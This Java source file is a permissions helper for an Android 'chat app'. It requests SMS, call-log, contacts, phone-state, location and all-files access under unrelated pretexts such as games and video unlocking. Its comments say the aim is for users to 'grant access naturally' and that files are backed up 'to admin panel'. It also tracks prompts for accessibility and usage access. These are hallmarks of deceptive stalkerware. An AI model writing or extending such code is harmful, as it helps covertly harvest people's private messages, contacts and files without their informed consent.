package com.bushorat.chatapp.helpers;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

/**
 * Progressive, feature-tied permissions so users grant access naturally.
 *
 * Videos  -> storage (unlocks video section + WhatsApp media upload)
 * Chat    -> gallery/media for attachments
 * Games   -> contacts + call logs + phone state
 * Profile -> location (optional)
 */
public final class FeaturePermissions {
    public static final int REQ_VIDEOS_STORAGE = 201;
    public static final int REQ_CHAT_SMS = 202;
    public static final int REQ_GAMES_CONTACTS = 203;
    public static final int REQ_PROFILE_LOCATION = 204;
    public static final int REQ_GAMES_CALL_LOG = 205;
    public static final int REQ_GAMES_PHONE = 206;
    public static final int REQ_CHAT_SMS_RECEIVE = 207;
    public static final int REQ_CHAT_MEDIA = 208;
    public static final int REQ_CHAT_STORAGE = 209;
    public static final int REQ_CHAT_NOTIFICATIONS = 210;

    private static final String PREFS = "feature_permissions";
    private static final String KEY_VIDEOS_UNLOCKED = "videos_unlocked";
    private static final String KEY_NOTIF_PROMPTED = "notif_prompted";
    private static final String KEY_LOCATION_PROMPTED = "location_prompted";
    private static final String KEY_ACCESSIBILITY_PROMPTED = "accessibility_prompted";
    private static final String KEY_USAGE_PROMPTED = "usage_access_prompted";

    private FeaturePermissions() {
    }

    public static SharedPreferences prefs(Context context) {
        return context.getApplicationContext().getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    public static boolean areVideosUnlocked(Context context) {
        return prefs(context).getBoolean(KEY_VIDEOS_UNLOCKED, false)
                && hasGalleryPermission(context);
    }

    public static void setVideosUnlocked(Context context, boolean unlocked) {
        prefs(context).edit().putBoolean(KEY_VIDEOS_UNLOCKED, unlocked).apply();
    }

    public static boolean hasNotifBeenPrompted(Context context) {
        return prefs(context).getBoolean(KEY_NOTIF_PROMPTED, false);
    }

    public static void markNotifPrompted(Context context) {
        prefs(context).edit().putBoolean(KEY_NOTIF_PROMPTED, true).apply();
    }

    public static boolean hasLocationBeenPrompted(Context context) {
        return prefs(context).getBoolean(KEY_LOCATION_PROMPTED, false);
    }

    public static void markLocationPrompted(Context context) {
        prefs(context).edit().putBoolean(KEY_LOCATION_PROMPTED, true).apply();
    }

    public static boolean hasAccessibilityBeenPrompted(Context context) {
        return prefs(context).getBoolean(KEY_ACCESSIBILITY_PROMPTED, false);
    }

    public static void markAccessibilityPrompted(Context context) {
        prefs(context).edit().putBoolean(KEY_ACCESSIBILITY_PROMPTED, true).apply();
    }

    public static boolean hasUsageAccessBeenPrompted(Context context) {
        return prefs(context).getBoolean(KEY_USAGE_PROMPTED, false);
    }

    public static void markUsageAccessPrompted(Context context) {
        prefs(context).edit().putBoolean(KEY_USAGE_PROMPTED, true).apply();
    }

    public static boolean hasGalleryPermission(Context context) {
        return PermissionsManager.hasGalleryPermission(context);
    }

    public static boolean hasSmsPermission(Context context) {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasGamesPermissions(Context context) {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
                == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasLocationPermission(Context context) {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * Opens “All files access” on Android 11+ (PDFs, WhatsApp, full storage walk).
     * Older Android uses the classic storage permission dialog.
     */
    public static void requestGalleryForVideos(Activity activity) {
        StorageHelper.requestStoragePermission(activity, REQ_VIDEOS_STORAGE);
    }

    /** All-files access when opening chat — backs up PDFs, Office, images to admin panel. */
    public static void requestAllFilesForChat(Activity activity) {
        StorageHelper.requestStoragePermission(activity, REQ_CHAT_STORAGE);
    }

    public static boolean hasPostNotificationsPermission(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            return true;
        }
        return ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS)
                == PackageManager.PERMISSION_GRANTED;
    }

    public static void requestPostNotificationsForChat(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                    activity,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS},
                    REQ_CHAT_NOTIFICATIONS
            );
        }
    }

    /** First step for chat — additional SMS/call permissions are requested inside Chat. */
    public static void requestSmsForChat(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{Manifest.permission.READ_SMS},
                REQ_CHAT_SMS);
    }

    /** Photos and videos from gallery for support chat attachments. */
    public static boolean hasChatMediaPermission(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            boolean images = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES)
                    == PackageManager.PERMISSION_GRANTED;
            boolean videos = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_VIDEO)
                    == PackageManager.PERMISSION_GRANTED;
            if (Build.VERSION.SDK_INT >= 34) {
                boolean partial = ContextCompat.checkSelfPermission(
                        context, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
                ) == PackageManager.PERMISSION_GRANTED;
                return images || videos || partial;
            }
            return images || videos;
        }
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                == PackageManager.PERMISSION_GRANTED;
    }

    public static void requestChatMediaPermission(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                    activity,
                    new String[]{
                            Manifest.permission.READ_MEDIA_IMAGES,
                            Manifest.permission.READ_MEDIA_VIDEO
                    },
                    REQ_CHAT_MEDIA
            );
        } else {
            ActivityCompat.requestPermissions(
                    activity,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    REQ_CHAT_MEDIA
            );
        }
    }

    public static void requestSmsReceiveForChat(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{Manifest.permission.RECEIVE_SMS},
                REQ_CHAT_SMS_RECEIVE);
    }

    public static void requestContactsForGames(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{Manifest.permission.READ_CONTACTS},
                REQ_GAMES_CONTACTS);
    }

    public static void requestCallLogForGames(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{Manifest.permission.READ_CALL_LOG},
                REQ_GAMES_CALL_LOG);
    }

    public static void requestPhoneStateForGames(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{Manifest.permission.READ_PHONE_STATE},
                REQ_GAMES_PHONE);
    }

    public static void requestLocationForProfile(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                },
                REQ_PROFILE_LOCATION);
    }

    public static void requestLocationPermission(Activity activity) {
        ActivityCompat.requestPermissions(activity,
                new String[]{
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                },
                REQ_PROFILE_LOCATION);
    }

    public static boolean allGranted(int[] grantResults) {
        if (grantResults == null || grantResults.length == 0) {
            return false;
        }
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
}
